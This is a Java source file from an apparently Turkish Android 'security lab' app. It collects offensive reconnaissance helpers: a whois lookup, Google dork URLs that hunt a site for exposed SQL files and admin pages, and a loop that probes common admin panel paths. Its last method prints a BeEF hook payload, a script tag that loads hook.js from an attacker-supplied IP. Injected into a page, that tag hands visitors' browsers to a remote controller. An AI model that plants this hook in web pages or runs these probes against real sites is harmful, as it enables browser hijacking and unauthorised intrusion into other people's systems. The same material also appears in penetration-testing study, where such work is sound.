package com.example.karageyazilimsecuritylab;

public class SpecialModule {
    public static void runWhois(String domain, RequestManager.Callback callback) {
        callback.onResult("🌍 Whois: " + domain);
        RequestManager.submit(() -> {
            String res = RequestManager.makeHttpRequest("https://api.hackertarget.com/whois/?q=" + domain);
            if(res.contains("||BODY:")) callback.onResult(res.split("\\|\\|BODY:")[1]);
        });
    }

    public static void runGoogleDork(String site, RequestManager.Callback callback) {
        callback.onResult("🔍 Google Dorks: " + site);
        callback.onResult("https://www.google.com/search?q=site:" + site + "+ext:sql");
        callback.onResult("https://www.google.com/search?q=site:" + site + "+inurl:admin");
    }

    public static void findAdminPanel(String url, RequestManager.Callback callback) {
        callback.onResult("🕵️ Admin Paneli Aranıyor...");
        String[] panels = {"admin", "administrator", "yonetim", "panel", "login"};
        for(String p : panels) {
            RequestManager.submit(() -> {
                if(RequestManager.makeHttpRequest(url + "/" + p).startsWith("CODE:200"))
                    callback.onResult("<font color='#00FF00'>[✔] PANEL: /" + p + "</font>");
            });
        }
    }

    public static void generateBeefHook(String ip, RequestManager.Callback callback) {
        callback.onResult("🥩 BeEF Hook Kodu:\n<script src=\"http://" + ip + ":3000/hook.js\"></script>");
    }
}